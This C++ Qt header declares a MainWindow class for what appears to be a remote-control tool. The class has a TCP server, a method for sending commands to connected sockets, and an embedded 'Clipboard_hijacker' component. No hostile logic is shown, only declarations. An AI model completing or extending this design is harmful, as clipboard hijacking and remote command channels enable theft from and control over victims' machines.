#ifndef MAINWINDOW_H
#define MAINWINDOW_H
#include <QFileDialog>
#include <QJsonObject>
#include <QJsonArray>
#include <QFile>
#include <QTableWidgetItem>
#include <QJsonDocument>
#include <QTcpSocket>
#include <QMessageBox>
#include <clipboard_hijacker.h>
#include <QtGui>
#include <QLabel>
#include <QDebug>
#include <QApplication>
#include "clipboard_hijacker.h"
#include "screen_saver.h"
#include "unistd.h"
#include <QtTest/QTest>
#include    <QTcpServer>

#include <QMainWindow>

QT_BEGIN_NAMESPACE
namespace Ui { class MainWindow; }
QT_END_NAMESPACE

class MainWindow : public QMainWindow
{
    Q_OBJECT

public:
    MainWindow(QWidget *parent = nullptr);
    ~MainWindow();
    void sendCmd(QString,QTcpSocket* newsocket);

private slots:
    void read();
    void incomingConnection();
private:
    QTcpServer *serversocket;
    Clipboard_hijacker *clippy = new Clipboard_hijacker();
    Ui::MainWindow *ui;
    QTcpSocket* currentSocket;
};
#endif // MAINWINDOW_H
